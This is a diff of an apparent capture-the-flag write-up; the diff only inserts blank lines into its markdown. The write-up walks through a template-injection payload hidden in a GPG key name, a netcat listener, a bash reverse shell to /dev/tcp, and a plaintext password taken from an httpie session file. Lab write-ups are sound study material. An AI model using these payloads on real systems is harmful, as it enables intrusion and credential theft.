@@ -81,6 +81,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 #### Exploitation
 
 1. Generate a GPG keypair using `gpg --full-generate-key`, set the name to the following value:
+    
     ```py
     {{''.__class__.mro()[-1].__subclasses__()[439](request.form.input,shell=True,stdout=-1).communicate()[0].strip()}}
     ```
@@ -90,22 +91,26 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
     - → the value of the POST parameter will be executed
 
 2. Export the public key and enter it on the `/guide`-page in the verification form:
+    
     ```
     gpg --armor --export <email> > mykey.gpg
     ```
     - `<email>` is the email that was specified during key generation
 
 3. Sign any message using the generated keypair and enter it on the website:
+    
     ```
     gpg --armor --clear-sign -u <email> -o <output file> <message>
     ```
 
 4. Start a reverse shell listener using netcat:
+    
     ```
     nc -lvnp 9002
     ```
 
 5. Verify the signed message using the form, but intercept the request using burpsuite. Add the POST parameter `input` with the url-encoded payload for a reverse shell:
+    
     ```bash
     bash -c '/bin/sh -i >& /dev/tcp/<your ip>/9002 0>&1'
     # url-encoded as a POST paramter:
@@ -128,6 +133,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 #### Exploitation
 
 1. `/home/atlas/.config/httpie/sessions/localhost_5000/admin.json` contains credentials for user `silentobserver`:
+    
     ```json
     "auth": {
             "password": "quietLiketheWind22",
@@ -202,6 +208,7 @@ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-sma
 
 
 2. Start a reverse shell listener using netcat:
+    
     ```
     nc -lvnp 9002
     ```
